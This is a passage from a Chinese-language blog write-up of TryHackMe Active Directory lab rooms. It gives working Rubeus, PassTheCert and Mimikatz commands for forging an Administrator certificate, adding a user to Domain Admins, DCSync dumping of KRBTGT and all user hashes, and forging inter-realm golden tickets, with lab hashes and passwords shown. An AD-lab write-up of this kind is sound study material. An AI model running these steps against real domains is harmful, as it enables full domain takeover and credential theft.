是一个机器账户，通常权限较低。但这里，它被授予了申请这个证书模板的权限。</li><li><strong>攻击利用</strong>: 攻击者只需要攻陷 <code>THMSERVER2</code> 这台机器，就可以利用它的机器账户权限，去申请一个具备上述所有漏洞（可自定义主体、可导出私钥）的证书。</li></ul><p>这三点环环相扣，构成了<strong>一个完美的 AD 证书攻击链</strong>：</p><ol><li><strong><code>ZA\THMSERVER2$</code></strong> 拥有<strong>申请</strong>证书的权限。</li><li>申请时，可以<strong>伪造主体名称</strong>为 <code>Administrator</code>。</li><li>获得的证书的私钥<strong>可以被导出</strong>，从而实现持久化。</li></ol><h4 id="伪造证书"><a href="#伪造证书" class="headerlink" title="伪造证书"></a>伪造证书</h4><p>去 MMC 生成一张伪造 <a href="mailto:&#65;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#97;&#x74;&#x6f;&#x72;&#64;&#x7a;&#x61;&#x2e;&#116;&#x72;&#121;&#x68;&#97;&#99;&#x6b;&#109;&#x65;&#x2e;&#108;&#x6f;&#99;">&#65;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#97;&#x74;&#x6f;&#x72;&#64;&#x7a;&#x61;&#x2e;&#116;&#x72;&#121;&#x68;&#97;&#99;&#x6b;&#109;&#x65;&#x2e;&#108;&#x6f;&#99;</a> 的证书，然后<strong>带私钥</strong>导出来，带私钥是为了生成 TGT，不懂的可以回顾之前 Kerberos 认证过程。</p><p>现在，我们终于可以冒充用户了。要做到这一点，需要两个步骤：</p><ul><li>使用证书申请 TGT</li><li>将 TGT 加载到工具中</li></ul><p>第一步，我们用 <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> 工具来实现这一点：</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">Rubeus.exe </span><span style="color: #E06C75">asktgt</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:</span><span style="color: #E06C75">Administrator</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">enctype</span><span style="color: #ABB2BF">:</span><span style="color: #E06C75">aes256</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">certificate</span><span style="color: #ABB2BF">:ABC.</span><span style="color: #E06C75">pfx</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">password</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">outfile</span><span style="color: #ABB2BF">:tgt.</span><span style="color: #E06C75">tgt</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">domain</span><span style="color: #ABB2BF">:za.tryhackme.</span><span style="color: #E06C75">loc</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">dc</span><span style="color: #ABB2BF">:thmdc.za.tryhackme.loc</span></span><span class="line"><span style="color: #ABB2BF"># 这里碰到了报错</span></span><span class="line"><span style="color: #ABB2BF">[X] </span><span style="color: #E06C75">KRB</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">ERROR</span><span style="color: #ABB2BF"> (</span><span style="color: #D19A66">16</span><span style="color: #ABB2BF">) : KDC_ERR_PADATA_TYPE_NOSUPP</span></span></code></pre></div></div></figure><p>报错 <code>KDC_ERR_PADATA_TYPE_NOSUPP</code> 表明，域控制器<strong>不支持</strong>你使用的证书类型进行 <strong>PKINIT 认证</strong>。这可能是因为域控没有正确配置，或者你的工具和域控的协议版本不兼容。我们转成 LDAP 认证，LDAP 认证也支持使用证书，它将证书作为身份凭证来修改目录服务。</p><p>做到这一块其实我卡了一个小时作用，这个方法是从 Discord 频道里面找到的，看来 AD 这块我的认知还是太少了。</p><h4 id="使用-LDAP-进行认证"><a href="#使用-LDAP-进行认证" class="headerlink" title="使用 LDAP 进行认证"></a>使用 LDAP 进行认证</h4><p>从<a href="https://github.com/The-Viper-One/Invoke-PassTheCert">这里</a>下载 PassTheCert PowerShell 脚本。我没有加载这个 TGT，而是把我的用户加进 DOMAIN ADMINS 组，这个组对域内的所有机器都有权限，也包括 THMDC 这台机器。</p><img src="/thm_ad/image-20250807052300452.png" class="" title="image-20250807052300452"><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 用点源载入脚本</span></span><span class="line"><span style="color: #ABB2BF">. .</span><span style="color: #56B6C2">/Invoke-PassTheCert.ps1</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 利用证书的权限执行 whoami</span></span><span class="line"><span style="color: #56B6C2">Invoke-PassTheCert</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #98C379">&quot;thmdc.za.tryhackme.loc&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Certificate </span><span style="color: #98C379">&quot;c:/tools/ABC.pfx&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CertificatePassword </span><span style="color: #98C379">&quot;1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Whoami</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 把自己的用户加进 DOMAIN ADMINS 组</span></span><span class="line"><span style="color: #56B6C2">Invoke-PassTheCert</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #98C379">&quot;thmdc.za.tryhackme.loc&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Certificate </span><span style="color: #98C379">&quot;c:/tools/ABC.pfx&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CertificatePassword </span><span style="color: #98C379">&quot;1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AddToGroup </span><span style="color: #98C379">&quot;CN=BARBARA.REID,OU=SALES,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupDN </span><span style="color: #98C379">&quot;CN=DOMAIN ADMINS,CN=USERS,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># SSH 连进去</span></span><span class="line"><span style="color: #ABB2BF">ssh barbara.reid</span><span style="color: #E06C75">@thmdc.za.tryhackme.loc</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 拿 Flag</span></span><span class="line"><span style="color: #ABB2BF">type C:\Users\Administrator\Desktop\flag5.txt</span></span></code></pre></div></div></figure><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html">https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html</a></p><p><a href="https://www.thehacker.recipes/ad/movement/schannel/passthecert">https://www.thehacker.recipes/ad/movement/schannel/passthecert</a></p><h2 id="Exploiting-Domain-Trusts"><a href="#Exploiting-Domain-Trusts" class="headerlink" title="Exploiting Domain Trusts"></a>Exploiting Domain Trusts</h2><p><strong>域信任</strong>是一种机制，允许网络中的用户访问本域之外的资源。它定义了林内部不同域之间的通信方式，在某些特殊情况下，信任也可以扩展到外部域或整个林。</p><p>域之间主要有两种信任类型：</p><ul><li><strong>方向性</strong>：信任的方向是从**信任域（Trusting Domain）**流向**受信域（Trusted Domain）**。</li><li><strong>传递性</strong>：信任关系不限于两个域之间，而是可以<strong>传递</strong>到其他被信任的域。</li></ul><p>在一个林中，通常会有一个根域或父域，比如我们的 <strong>TRYHACKME.LOC</strong>。为了方便管理，会为各个地区办事处创建子域，如 <strong>ZA.TRYHACKME.LOC</strong> 和 <strong>UK.TRYHACKME.LOC</strong>。</p><p>这种林配置使得 ZA 和 UK 办事处可以共享资源。举个例子，如果 UK 办事处的一个用户需要访问 <strong>THMSERVER1</strong>，我们可以授权该用户访问 ZA 域内的资源。这之所以可行，是因为 ZA 和根域、UK 和根域之间都存在<strong>双向信任</strong>，从而在 ZA 和 UK 之间建立了<strong>可传递的信任关系</strong>。</p><p>父域和子域之间的双向信任是 <strong>Active Directory 的预期行为</strong>，它的目的是通过可传递的信任关系来简化资源共享。</p><p>然而，作为攻击者，我们也可以利用这个信任关系。如果我们成功<strong>攻陷了子域</strong>，就可以滥用子域对父域的信任，进一步<strong>入侵父域</strong>。</p><h3 id="KRBTGT-and-Golden-Tickets"><a href="#KRBTGT-and-Golden-Tickets" class="headerlink" title="KRBTGT and Golden Tickets"></a>KRBTGT and Golden Tickets</h3><p><strong>KRBTGT</strong> 是微软实现 <strong>Kerberos 认证</strong>协议的核心账户。它的名字来自 Kerberos（KRB）和票据授权票据（TGT）。</p><p>这个账户本质上就是 Kerberos 分发中心（KDC）服务的“身份”，而 KDC 负责处理所有的 Kerberos 票据请求。KRBTGT 账户的密码哈希被用来<strong>加密和签名域内的所有 Kerberos 票据</strong>。由于所有域控制器都共享这个哈希，当用户请求访问资源时，域控制器就能用它来验证收到的 TGT 是否真实有效。</p><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>那么，如果我们想要自己生成 TGT，从而获得对所有资源的访问权限，该怎么办呢？这就是著名的<strong>黄金票据攻击（Golden Ticket attack）</strong>。</p><p>在黄金票据攻击中，我们完全绕过 KDC，自己创建 TGT，<strong>摇身一变成为一个临时的票据授权服务器（TGS）</strong>。</p><p>要伪造 TGT，我们需要收集以下四样关键信息：</p><ol><li>域的 FQDN（完全限定域名）</li><li>域的安全标识符（SID）</li><li>我们想要冒充的用户名</li><li><strong>KRBTGT 账户的密码哈希</strong></li></ol><p>前三项通常比较容易获取。但最后一项 <strong>KRBTGT 的密码哈希</strong>，只存储在域控制器上，因此需要我们先攻陷域才能拿到。</p><h4 id="dcysnc-攻击"><a href="#dcysnc-攻击" class="headerlink" title="dcysnc 攻击"></a>dcysnc 攻击</h4><p><code>dcsync</code> 是一种常见的攻击技术，它利用了 Active Directory（AD）域控制器之间用于同步数据的<strong>复制协议</strong>。攻击者通过冒充一台域控制器，向另一台域控制器请求复制指定用户的凭据，从而窃取密码哈希。</p><p>正常情况下，当一个域控制器上的用户账户发生变化时（比如修改了密码），它会通过一个称为 Directory Replication Service (DRS) Remote Protocol 的协议，通知其他域控制器进行数据同步。</p><p><code>dcsync</code> 攻击正是滥用了这个正常且必要的功能。攻击者在拥有特定高权限账户（通常是域管理员）后，会执行 <code>dcsync</code> 命令，伪装成一个合法的域控制器，并向目标域控制器发送一个数据复制请求。目标域控制器会误以为这是一次正常的同步，并将请求用户的密码哈希发送给攻击者的机器。</p><p>接下来，我们将再次使用 <strong>Mimikatz</strong>，通过 <code>dcsync</code> 攻击在 <strong>THMSERVER2</strong> 上拿到 KRBTGT 的密码 hash。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 让我的用户有 DSSync 权限</span></span><span class="line"><span style="color: #56B6C2">Invoke-PassTheCert</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #98C379">&quot;thmdc.za.tryhackme.loc&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Certificate </span><span style="color: #98C379">&quot;c:/tools/ABC.pfx&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CertificatePassword </span><span style="color: #98C379">&quot;1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Elevate </span><span style="color: #98C379">&quot;CN=BARBARA.REID,OU=SALES,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 执行 mimikatz</span></span><span class="line"><span style="color: #ABB2BF">mimikatz_trunk\x64\</span><span style="color: #56B6C2">mimikatz.exe</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">privilege::debug</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 模拟一台域控制器，请求域内的另一台域控制器将 krbtgt 用户的凭据信息复制给我</span></span><span class="line"><span style="color: #ABB2BF">lsadump::dcsync </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:za\krbtgt</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">Credentials:</span></span><span class="line"><span style="color: #ABB2BF">  Hash NTLM: 16f9af38fca3ada405386b3b57366082</span></span><span class="line"><span style="color: #ABB2BF">    ntlm</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">: 16f9af38fca3ada405386b3b57366082</span></span><span class="line"><span style="color: #ABB2BF">    lm  </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">: 35c7b671efe40860dc078afd2786c902</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># RDP 连上 THMDC</span></span><span class="line"><span style="color: #ABB2BF">xfreerdp3 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">v:thmdc.za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">d:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">u:barbara.reid </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">p:Password1 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">timeout:</span><span style="color: #D19A66">60000</span></span></code></pre></div></div></figure><h3 id="Inter-Realm-TGTs"><a href="#Inter-Realm-TGTs" class="headerlink" title="Inter-Realm TGTs"></a>Inter-Realm TGTs</h3><p>我们现在拥有了 KRBTGT 账户的密码哈希，这使我们可以在子域中伪造黄金票据来访问任何资源。更进一步，我们可以伪造一种叫做<strong>跨域 TGT（Inter-Realm TGT）</strong>的票据。这种票据专门用于访问其他域的资源。</p><p>我们的目标是利用子域和父域之间的双向信任关系，来获取对父域的完全访问权限。</p><p>在伪造黄金票据时，我们将在票据中加入来自其他域的额外账户 SID，以此来执行攻击。<code>Mimikatz</code> 工具可以帮助我们实现这一点，它允许我们在 Kerberos TGT 的 <code>KERB_VALIDATION_INFO</code> 结构中设置 <code>ExtraSids</code> 部分。<code>ExtraSids</code> 被描述为“一个指向 <code>KERB_SID_AND_ATTRIBUTES</code> 结构的指针列表，其中包含的 SID 对应于主体所属账户域之外的其他域中的组”。</p><p>这里的关键是，我们将利用父域对我们子域的信任。具体做法是，在为子域的域控制器伪造票据时，我们将 <strong>父域中的“Enterprise Admins (EA)”组的 SID</strong> 作为额外 SID 添加到票据中。EA 组属于父域，其成员资格实际上赋予了对整个林的管理员权限！这个组的默认 SID 是 <code>S-1-5-21-&lt;RootDomain&gt;-519</code>。</p><p>在进行攻击之前，我们首先需要获取两个 SID：</p><ol><li><strong>子域域控制器（THMDC）的 SID</strong>，这是我们将在伪造的 TGT 中冒充的对象。</li><li><strong>父域中 Enterprise Admins 组的 SID</strong>，这是我们将作为额外 SID 添加到伪造 TGT 中的 SID。</li></ol><p>为了获取这两个 SID，我们可以使用 <code>AD-RSAT</code> PowerShell 命令。我们可以使用以下命令来获取子域域控制器的 SID：</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 找到子域控的 SID</span></span><span class="line"><span style="color: #56B6C2">Get-ADComputer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;THMDC&quot;</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># S-1-5-21-3885271727-2693558621-2658995185-1001</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 找到父域 Enterprise Admins 组的 SID</span></span><span class="line"><span style="color: #56B6C2">Get-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;Enterprise Admins&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server thmrootdc.tryhackme.loc</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># S-1-5-21-3330634377-1326264276-632209373-519</span></span></code></pre></div></div></figure><h4 id="滥用域信任"><a href="#滥用域信任" class="headerlink" title="滥用域信任"></a>滥用域信任</h4><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">mimikatz_trunk\x64\</span><span style="color: #56B6C2">mimikatz.exe</span></span><span class="line"><span style="color: #ABB2BF">privilege::debug</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 伪造 Inter-Realm 金票</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这里的 sids 就是上面父域中找到的那个组的 SID</span></span><span class="line"><span style="color: #ABB2BF">kerberos::golden </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:Administrator </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">sid:S</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">5</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">21</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">3885271727</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2693558621</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2658995185</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1001</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">service:krbtgt </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">rc4:16f9af38fca3ada405386b3b57366082 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">sids:S</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">5</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">21</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">3330634377</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1326264276</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">632209373</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">519</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">ptt</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 拿 Flag</span></span><span class="line"><span style="color: #ABB2BF">type \\thmrootdc.tryhackme.loc\c$\Users\Administrator\Desktop\flag6.txt</span></span></code></pre></div></div></figure><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>我个人觉得还是因为 AD 的复杂性导致这么多的权限问题，小权限用户可以加组，然后那个组可以改管理员的密码？这个在一开始不应该警告用户吗？</p><p>再到 Kerberos 委派可以<strong>不经过用户同意</strong>去以他的身份申请证书（WTF？？）。然后就是利用打印机服务可以远程让一个机器去请求另外一个机器（SSRF？），最难崩的还是通信过程不强制加密，直接给拦咯。</p><p>后面那个密码记录和 GPO 修改就感觉挺正常的，不算设计上的问题。到后面那个证书就纯纯的是用户的锅了，感觉又不全是，微软得背一半。按理说这种可以伪造 SAN 的证书就应该保留一个原始的名字，而且对于这种敏感权限的调用，这种证书就应该默认拒绝。</p><p>金票更是难绷，整个认证就靠一个 Hash？？当时听别人说金票银票挺高级的，结果就这？dcsync 一个同步能把用户的 Hash 同步过来，就不知道说什么了。跨域信任就挺正常，算是正常利用吧。</p><p>总之这个房间让我学到了超级多 AD 的问题和利用点，感觉 AD 这种安全性是 M$ 的人一拍脑子想下来到的东西，可能也和屎山有关系，最主要的我还是觉得是那个 Hash 问题很大很大。</p><p>在管理方来看，这种设计问题就挺难避免的，在增加类似权限的时候，我觉得可以增加一些检查机制，来揭示出这种攻击路径，或许已经有类似安全工具可以检查了。</p><h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><ul><li><a href="https://www.netwrix.com/silver_ticket_attack_forged_service_tickets.html">Silver Ticket Attack</a></li><li><a href="https://www.netwrix.com/how_golden_ticket_attack_works.html">Golden Ticket Attack</a></li><li><a href="https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html">Kerberoasting Attack</a></li><li><a href="https://www.netwrix.com/ntds_dit_security_active_directory.html?cID=70170000000kgEZ">NTDS.dit Password Extraction</a></li><li><a href="https://www.netwrix.com/privilege_escalation_using_mimikatz_dcsync.html?cID=70170000000kgEZ">DCSync Attack Using Mimikatz Detection</a></li></ul><hr><h1 id="Persisting-Active-Directory"><a href="#Persisting-Active-Directory" class="headerlink" title="Persisting Active Directory"></a>Persisting Active Directory</h1><p>irene.leach</p><p>Password1</p><h2 id="Persistence-through-Credentials"><a href="#Persistence-through-Credentials" class="headerlink" title="Persistence through Credentials"></a>Persistence through Credentials</h2><p>这一节讲了利用 dcsync 把密码的 hash 全部 dump 出来，然后离线爆破</p><h3 id="域同步（DC-Sync）"><a href="#域同步（DC-Sync）" class="headerlink" title="域同步（DC Sync）"></a>域同步（DC Sync）</h3><p>大型组织中，为了保证认证服务的响应速度，一个域通常会部署多个域控制器（DC）。为了让所有 DC 的数据保持一致，它们会通过<strong>域复制（Domain Replication）</strong>机制来同步信息。</p><p>每个 DC 都会运行一个名为 <strong>KCC</strong> 的进程，它会建立一个复制拓扑，并通过 <strong>RPC</strong> 与其他 DC 同步用户密码、新账户等信息。这就是为什么更改密码后，有时需要等待几分钟才能在新地点登录，因为你登录的 DC 可能还没来得及同步最新的密码。</p><p>这个同步过程也称为 <strong>DC 同步（DC Synchronisation）</strong>。除了 DC 自己，拥有域管理员权限的账户也可以为了合法目的发起这个同步。</p><p>如果攻击者获取了拥有域复制权限的账户，就可以执行 <strong><code>DC Sync</code> 攻击</strong>，冒充 DC 来从另一个 DC 窃取凭据。</p><h3 id="凭据并非都一样"><a href="#凭据并非都一样" class="headerlink" title="凭据并非都一样"></a>凭据并非都一样</h3><p>在 <code>DC Sync</code> 攻击中，选择要窃取的凭据非常关键。虽然域管理员凭据权限最高，但蓝队一旦发现入侵，会最先重置这类账户的密码，导致你可能很快失去访问权限。</p><p>所以，更聪明的做法是获取<strong>接近高权限但又不易被察觉的凭据</strong>，以此实现<strong>持久化访问</strong>。这些凭据类型包括：</p><ul><li><strong>多台机器的本地管理员账户</strong>：通常有专门的组拥有对大量计算机的本地管理员权限。窃取这些账户的凭据，可以让你保持对大部分机器的访问。</li><li><strong>拥有委派权限的服务账户</strong>：利用这类账户可以发动 Kerberos 委派攻击，例如<strong>黄金票据</strong>和<strong>白银票据</strong>。</li><li><strong>特权 AD 服务账户</strong>：例如 Exchange、WSUS 或 SCCM 的账户。攻陷这些账户可以作为跳板，再次获得高权限。</li></ul><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">C:\Tools\mimikatz_trunk\x64\</span><span style="color: #56B6C2">mimikatz.exe</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 试验同步一个账户</span></span><span class="line"><span style="color: #ABB2BF">lsadump::dcsync </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:irene.leach</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 启用记录功能</span></span><span class="line"><span style="color: #ABB2BF">log recopec_dcdump.txt</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 通过同步提取所有用户的信息</span></span><span class="line"><span style="color: #ABB2BF">lsadump::dcsync </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">all</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 筛选文件</span></span><span class="line"><span style="color: #ABB2BF">cat &lt;username&gt;_dcdump.txt | grep </span><span style="color: #98C379">&quot;SAM Username&quot;</span></span><span class="line"><span style="color: #ABB2BF">cat recopec_dcdump.txt | grep </span><span style="color: #98C379">&quot;Hash NTLM&quot;</span></span></code></pre></div></div></figure><h2 id="Persistence-through-Tickets"><a href="#Persistence-through-Tickets" class="headerlink" title="Persistence through Tickets"></a>Persistence through Tickets</h2><h3 id="Kerberos-认证基础"><a href="#Kerberos-认证基础" class="headerlink" title="Kerberos 认证基础"></a>Kerberos 认证基础</h3><p>Kerberos 认证的核心在于 <strong>TGT（票据授权票据）</strong>和 <strong>TGS（票据授权服务）</strong>。</p><ul><li><strong>TGT 请求</strong>：用户向域控制器（DC）发送一个包含用其 <strong>NTLM 哈希</strong>加密的时间戳的 <code>AS-REQ</code> 请求，以此来获取 TGT。DC 验证后，颁发一个用 <strong>KRBTGT</strong> 账户密码哈希签名的 TGT。</li><li><strong>TGS 请求</strong>：用户将 TGT 发送给 DC，请求访问特定资源的 <strong>TGS</strong>。如果 TGT 有效，DC 会颁发一个用该服务账户的 <strong>NTLM 哈希</strong>加密的 TGS。</li><li><strong>访问资源</strong>：用户将 TGS 提交给目标服务，服务验证后授予访问权限。</li></ul><hr><h3 id="黄金票据（Golden-Tickets）"><a href="#黄金票据（Golden-Tickets）" class="headerlink" title="黄金票据（Golden Tickets）"></a>黄金票据（Golden Tickets）</h3><p>黄金票据是<strong>伪造的 TGT</strong>。通过这种攻击，我们完全绕过了向 DC 证明身份的步骤。有了伪造的、拥有高权限账户的 TGT，我们就可以请求访问任何我们想要的服务。</p><p><strong>必要信息</strong>：要伪造黄金票据，攻击者需要四样东西：</p><ul><li><strong>KRBTGT 账户的密码哈希</strong></li><li>域的完全限定域名 (FQDN)</li><li>域的安全标识符 (SID)</li><li>要冒充的用户的 ID</li></ul><p><strong>攻击要点：</strong></p><ul><li><strong>核心需求</strong>：为了伪造黄金票据，我们必须拥有 <strong>KRBTGT 账户的密码哈希</strong>，因为它是所有 TGT 的签名者。</li><li><strong>绕过认证</strong>：我们不需要知道被冒充用户的密码哈希。只要票据由 KRBTGT 哈希签名，DC 就会无条件信任它。</li><li><strong>持久化</strong>：<ul><li>票据中的用户账户即使被禁用或删除，只要票据生成时间在 20 分钟内，依然有效。</li><li>我们可以修改票据的有效期，比如从 10 小时延长到 10 年，以此获得<strong>持久化访问</strong>。</li><li>KRBTGT 账户的密码默认不更改，一旦获取，除非手动重置两次（重置掉当前密码和历史密码，为了保持服务可用性），否则我们可以永久使用。</li><li>轮换 KRBTGT 账户的密码对蓝队来说是一个痛苦的过程，有些服务不会自己拉取新的 TGT，导致宕机。</li></ul></li><li><strong>隐蔽性</strong>：黄金票据可以在任何机器上生成，甚至是未加入域的机器，这使得攻击更难被发现。</li><li><strong>高权限</strong>：黄金票据甚至可以绕过智能卡认证，并且提供对域内所有资源的完全控制。</li></ul><hr><h3 id="白银票据（Silver-Tickets）"><a href="#白银票据（Silver-Tickets）" class="headerlink" title="白银票据（Silver Tickets）"></a>白银票据（Silver Tickets）</h3><p>白银票据是<strong>伪造的 TGS</strong>。与黄金票据不同，我们跳过了与 KDC 的所有通信，直接与我们想要访问的服务进行交互。</p><p>要伪造一张白银票据，你需要以下四样关键信息：</p><ol><li><strong>目标服务账户的 NTLM 哈希</strong>：这是最核心的，因为这个哈希是用来加密和签名票据的“密钥”。通常，这个哈希是目标服务器的<strong>机器账户哈希</strong>（例如 <code>THMSERVER1$</code>）。</li><li>**域的安全标识符 (SID)**：用于标识票据所属的域。</li><li><strong>要冒充的用户的 